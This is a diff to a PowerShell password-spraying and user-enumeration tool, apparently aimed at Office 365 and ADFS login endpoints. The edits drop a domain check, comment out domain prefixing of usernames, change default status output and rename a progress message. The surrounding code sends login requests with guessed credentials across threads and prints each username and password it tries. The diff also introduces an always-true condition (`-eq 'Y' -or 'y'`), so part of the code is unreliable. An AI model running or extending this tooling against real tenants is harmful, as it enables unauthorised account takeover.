@@ -2052,7 +2052,7 @@ Param(
 
                       $O365Request = Invoke-WebRequest -Uri "$uri/common/login" -Headers $headers -Method POST -Body $PostDataStage -MaximumRedirection 0 -WebSession $session 
 
-                      if ($Status -eq 'Y')
+                      if ($Status -eq 'Y' -or 'y')
                           {
                               write-host "`t Current User:$Username Current Password:$password"
                           }
@@ -2191,7 +2191,6 @@ function Invoke-UserEnumeration365{
   Param(
       [Parameter(Position = 0, Mandatory = $False)][string]$OutFile = "",
       [Parameter(Position = 1, Mandatory = $False)][string]$Userlist = "",
-      [Parameter(Position = 2, Mandatory = $False)][string]$Domain = "",
       [Parameter(Position = 3, Mandatory = $False)][string]$Threads = "5",
       [Parameter(Position = 4, Mandatory = $False)][ValidateSet("Y","N")][String]$Status = "Y"
   ) 
@@ -2204,12 +2203,7 @@ function Invoke-UserEnumeration365{
           {
               Write-Error "Invalid number of arguments given. Require -Userlist"
           }
-  
-      if ($Domain -eq "")
-      {
-          Write-Error "Invalid number of arguments given. Require -Domain"
-      }
-  
+   
       $Usernames = Get-Content $UserList
       $count = $Usernames.count
       $userlists = @{}
@@ -2310,7 +2304,7 @@ function Invoke-UserEnumeration365{
                   }       
   
               $RunningJobs = $RunningJobs.Substring(2)
-              Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+              Write-Progress -Activity "Spraying Users..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
               if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
                   {
                       Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
@@ -2398,7 +2392,7 @@ Param(
     [Parameter(Position = 3, Mandatory = $False)][string]$Domain = "",
     [Parameter(Position = 4, Mandatory = $False)][string]$Threads = "5",
     [Parameter(Position = 5, Mandatory = $False)][string]$URL = "",
-    [Parameter(Position = 6, Mandatory = $False)][ValidateSet("Y","N")][String]$Status = "N"
+    [Parameter(Position = 6, Mandatory = $False)][ValidateSet("Y","N")][String]$Status = "Y"
 ) 
 
     Write-Host -ForegroundColor "yellow" "[*] Now spraying password against ADFS"
@@ -2487,10 +2481,10 @@ Param(
                         }
 
                         $ProgressPreference = 'silentlycontinue'
-                        if ($Domain -ne "")
-                            {
-                                $Username = ("$Domain" + "\" + "$Username")
-                            }
+                        #if ($Domain -ne "")
+                        #    {
+                        #        $Username = ("$Domain" + "\" + "$Username")
+                        #    }
 
                         add-type @"
                             using System.Net;
